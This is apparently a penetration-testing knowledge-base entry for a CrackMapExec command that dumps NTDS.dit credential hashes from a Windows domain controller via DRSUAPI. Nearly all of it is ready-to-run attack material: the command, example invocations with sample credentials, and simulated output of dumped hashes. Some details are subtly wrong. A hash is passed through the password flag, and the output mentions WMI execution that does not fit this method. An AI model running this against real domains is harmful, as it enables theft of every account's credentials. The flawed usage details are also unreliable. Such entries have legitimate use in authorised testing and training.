---
id: e2cab460-1f95-4719-b444-eed26b5b06f5
name: crackmapexec-smb-ntds-drsuapi
type: command
executor: bash
data: cme smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --ntds drsuapi
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ntds
  - smb
  - credential-dumping
verified: true
validated: true
---

# crackmapexec-smb-ntds-drsuapi

## Command

```bash
cme smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --ntds drsuapi
```

## Description

This command leverages CrackMapExec to pull NTDS.dit hashes from a domain controller using the DRSUAPI (Directory Replication Service) method, simulating legitimate replication to avoid VSS dependencies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address of the target domain controller | Yes |
| -u | Username for SMB authentication | Yes |
| $_USERNAME | Actual username value | Yes |
| -p | Password for SMB authentication | Yes |
| $_PASSWORD | Actual password or hash | Yes |
| --ntds drsuapi | Use DRSUAPI method for NTDS extraction (default) | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.10 -u administrator -p Password123 --ntds drsuapi
```

### Advanced Usage

```bash
cme smb 192.168.1.10 -u admin -p aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --ntds drsuapi --no-bruteforce
```

## Expected Output

SMB         192.168.1.10    445    DOMAIN      [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:domain.local)
[*] Executing command via WMI
SMB         192.168.1.10    445    DOMAIN      [+] Command execution successful.
[*] Dumping NTDS.dit using DRSUAPI
username:rid:lmhash:nthash
Administrator:500::31d6cfe0d16ae931b73c59d7e0c089c0

Hashes exported to file for cracking.

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-Hashdump-NinjaCopy-and-CME]]
- [[tools/CrackMapExec]]
